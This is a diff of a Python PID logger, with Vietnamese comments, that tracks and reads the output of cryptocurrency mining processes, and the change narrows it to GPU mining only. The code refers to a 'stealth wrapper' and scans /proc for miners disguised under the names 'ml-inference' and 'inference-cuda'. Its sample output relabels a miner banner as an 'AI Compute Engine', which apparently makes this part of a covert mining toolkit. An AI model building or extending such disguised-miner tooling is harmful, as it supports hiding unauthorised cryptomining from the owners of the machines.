@@ -1,6 +1,6 @@
 """worker.py (đặt trong app/pid_logger)
 Enhanced PID Logger với Real Process Output Monitor.
-Ghi PID và runtime output cho CPU/GPU mining processes.
+Ghi PID và runtime output cho GPU mining processes.
 """
 from __future__ import annotations
 
@@ -20,7 +20,7 @@ from typing import Dict, Optional, Any
 # Cấu hình - Tự động phát hiện đường dẫn dựa trên script location
 _SCRIPT_DIR = pathlib.Path(__file__).parent.parent
 LOG_DIR = os.getenv("LOGS_DIR", str(_SCRIPT_DIR / "mining_environment" / "logs"))
-PID_CPU_FILE = pathlib.Path(LOG_DIR) / "pid_cpu.log"
+# PID_CPU_FILE removed - GPU-only operations
 PID_GPU_FILE = pathlib.Path(LOG_DIR) / "pid_gpu.log"
 MAX_SIZE_MB = 3
 
@@ -61,8 +61,8 @@ def _rotate_if_needed(path: pathlib.Path) -> None:
 
 def enqueue_pid(pid: int, mtype: str):
     """Ghi PID vào queue cho PID logging"""
-    if mtype not in ("cpu", "gpu"):
-        raise ValueError("mtype must be 'cpu' or 'gpu'")
+    if mtype != "gpu":
+        raise ValueError("mtype must be 'gpu' only")
     payload = {"pid": pid, "type": mtype, "ts": time.time()}
     _QUEUE.put(payload)
     logger.debug(f"Enqueued PID {payload['pid']} ({payload['type']}). Queue size: {_QUEUE.qsize()}")
@@ -73,12 +73,12 @@ def register_process(pid: int, process_type: str, process_obj, process_name: str
     
     Args:
         pid: Process ID
-        process_type: 'cpu' hoặc 'gpu'
+        process_type: 'gpu' only
         process_obj: subprocess.Popen object hoặc psutil.Process object
         process_name: Tên process (optional)
     """
-    if process_type not in ("cpu", "gpu"):
-        raise ValueError("process_type must be 'cpu' or 'gpu'")
+    if process_type != "gpu":
+        raise ValueError("process_type must be 'gpu' only")
     
     # Handle both subprocess.Popen and psutil.Process objects
     if hasattr(process_obj, 'poll'):
@@ -128,15 +128,9 @@ def _read_process_output_via_proc(pid: int) -> Optional[str]:
         
         # 🔧 ENHANCED: Multiple source strategy để capture real mining output
         
-        # Priority 1: Đọc từ wrapper output logs (stealth wrapper có thể ghi output riêng)
+        # Priority 1: Đọc từ wrapper output logs (GPU-only operations)
         wrapper_log_paths = []
-        if process_type == "cpu":
-            # CPU stealth wrapper removed - only check general CPU logs
-            wrapper_log_paths = [
-                f"{LOG_DIR}/ml_inference_{pid}.log", 
-                f"{LOG_DIR}/cpu_mining_output.log"
-            ]
-        elif process_type == "gpu":
+        if process_type == "gpu":
             wrapper_log_paths = [
                 f"{LOG_DIR}/stealth_inference_cuda_{pid}.log",
                 f"{LOG_DIR}/inference_cuda_{pid}.log",
@@ -171,11 +165,9 @@ def _read_process_output_via_proc(pid: int) -> Optional[str]:
                 except (OSError, IOError) as e:
                     logger.debug(f"Cannot read wrapper log {wrapper_path}: {e}")
         
-        # Priority 2: Đọc từ mining log files (cpu_miner.log, gpu_miner.log)
+        # Priority 2: Đọc từ mining log files (gpu_miner.log only)
         log_file_path = None
-        if process_type == "cpu":
-            log_file_path = f"{LOG_DIR}/cpu_miner.log"
-        elif process_type == "gpu":
+        if process_type == "gpu":
             log_file_path = f"{LOG_DIR}/gpu_miner.log"
         
         if log_file_path and os.path.exists(log_file_path):
@@ -310,7 +302,7 @@ def _output_monitor_loop():
                     _OUTPUT_QUEUE.put(output_entry)
                     logger.debug(f"Captured output from PID {pid}: {output_line[:50]}...")
             
-            # Sleep ngắn để không tốn quá nhiều CPU
+            # Sleep ngắn để không tốn quá nhiều tài nguyên
             time.sleep(0.5)
             
         except Exception as e:
@@ -326,12 +318,10 @@ def _output_writer_loop():
     logger.info("Output Writer Loop started")
     _ensure_log_dir()
     
-    # Mở file để ghi runtime output (tách biệt với PID log)
-    cpu_output_file = (pathlib.Path(LOG_DIR) / "pid_cpu.log").open("a", buffering=1, encoding="utf-8")
+    # Mở file để ghi runtime output (GPU-only operations)
     gpu_output_file = (pathlib.Path(LOG_DIR) / "pid_gpu.log").open("a", buffering=1, encoding="utf-8")
     
     files = {
-        "cpu": cpu_output_file,
         "gpu": gpu_output_file
     }
     
@@ -399,10 +389,9 @@ def _writer_loop():
     _ensure_log_dir()
     logger.info(f"Log directory verified: {LOG_DIR}")
     files = {
-        "cpu": PID_CPU_FILE.open("a", buffering=1, encoding="utf-8"),
         "gpu": PID_GPU_FILE.open("a", buffering=1, encoding="utf-8"),
     }
-    logger.info(f"Log files opened - CPU: {PID_CPU_FILE}, GPU: {PID_GPU_FILE}")
+    logger.info(f"Log files opened - GPU: {PID_GPU_FILE}")
     
     while not _STOP_EVENT.is_set():
         try:
@@ -422,7 +411,7 @@ def _writer_loop():
                 f.close()
             except Exception:
                 pass
-            files[item["type"]] = (PID_CPU_FILE if item["type"]=="cpu" else PID_GPU_FILE).open("a", buffering=1, encoding="utf-8")
+            files[item["type"]] = PID_GPU_FILE.open("a", buffering=1, encoding="utf-8")
     
     logger.info("PID logger worker thread shutting down")
     for f in files.values():
@@ -464,13 +453,16 @@ def force_restart_worker():
     logger.info("Force restarting PID Logger worker")
     start_worker()
 
-def log_pid(pid: int, is_cpu: bool):
-    logger.info(f"Logging PID {pid} (is_cpu={is_cpu})")
+def log_pid(pid: int, is_gpu: bool):
+    logger.info(f"Logging PID {pid} (is_gpu={is_gpu})")
     # Đảm bảo worker đang chạy trước khi enqueue
     if not _WORKER_STARTED.is_set():
         logger.warning("Worker not started, attempting to start now")
         start_worker()
-    enqueue_pid(pid, "cpu" if is_cpu else "gpu")
+    if is_gpu:
+        enqueue_pid(pid, "gpu")
+    else:
+        logger.warning(f"CPU logging disabled for PID {pid} - GPU-only operations")
 
 def debug_registry_status():
     """Debug function để kiểm tra trạng thái process registry"""
@@ -495,22 +487,22 @@ def debug_registry_status():
     logger.info(f"Worker status: STARTED={_WORKER_STARTED.is_set()}, OUTPUT_MONITOR={_OUTPUT_MONITOR_STARTED.is_set()}")
     logger.info(f"===============================")
 
-def force_test_output(test_pid: int = None, test_type: str = "cpu"):
+def force_test_output(test_pid: int = None, test_type: str = "gpu"):
     """Force test một output entry để verify format"""
     if test_pid is None:
         test_pid = 99999  # fake PID for testing
     
-    # 🔧 ENHANCED: Multiple test outputs để verify different mining scenarios
+    # 🔧 ENHANCED: GPU-only test outputs để verify different mining scenarios
     test_outputs = [
         "* ABOUT        AI Compute Engine/1.0.0 gcc/11.4.0 (built for Linux x86-64, 64 bit)",
-        "* ABOUT        CPU: Intel(R) Xeon(R) CPU @ 2.30GHz (8 threads)",
+        "* ABOUT        GPU: NVIDIA GeForce RTX 4090 (24GB VRAM)",
         "* ABOUT        Memory: 16 GB",
         "[2025-07-25 11:45:23] net      connecting to 127.0.0.1:4443",
         "[2025-07-25 11:45:24] net      connected to pool",
-        "[2025-07-25 11:45:25] cpu      speed 1234.5 H/s (100.0%) threads: 8",
+        "[2025-07-25 11:45:25] gpu      speed 125.4 MH/s (100.0%) cores: 8192",
         "[2025-07-25 11:45:26] pool     new job received",
-        "[2025-07-25 11:45:27] cpu      accepted (1/0) diff 65536 ms 234",
-        "[2025-07-25 11:45:28] cpu      speed 1245.2 H/s (100.0%) threads: 8"
+        "[2025-07-25 11:45:27] gpu      accepted (1/0) diff 65536 ms 234",
+        "[2025-07-25 11:45:28] gpu      speed 128.2 MH/s (100.0%) cores: 8192"
     ]
     
     for i, output in enumerate(test_outputs):
@@ -532,7 +524,7 @@ def force_test_output(test_pid: int = None, test_type: str = "cpu"):
 def manual_register_real_pids():
     """
     Manual registration của real mining PIDs để bypass complex detection logic.
-    Tìm và register real ml-inference và inference-cuda processes.
+    Tìm và register real inference-cuda processes (GPU-only).
     """
     logger.info("=== MANUAL REAL PID REGISTRATION ===")
     
@@ -553,20 +545,8 @@ def manual_register_real_pids():
             with open(f"{proc_dir}/cmdline", 'r') as f:
                 cmdline = f.read().strip()
             
-            # Check for ml-inference
-            if "ml-inference" in cmdline and "stealth" not in cmdline:
-                # Create a simple process-like object for registry
-                fake_proc = type('FakeProcess', (), {
-                    'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
-                    'is_running': lambda: os.path.exists(f"/proc/{pid}")
-                })()
-                
-                register_process(pid, "cpu", fake_proc, "ml-inference")
-                logger.info(f"✅ Registered real CPU mining PID: {pid}")
-                registered_count += 1
-                
-            # Check for inference-cuda  
-            elif "inference-cuda" in cmdline and "stealth" not in cmdline:
+            # Check for inference-cuda (GPU-only)
+            if "inference-cuda" in cmdline and "stealth" not in cmdline:
                 # Create a simple process-like object for registry
                 fake_proc = type('FakeProcess', (), {
                     'poll': lambda: None if os.path.exists(f"/proc/{pid}") else 0,
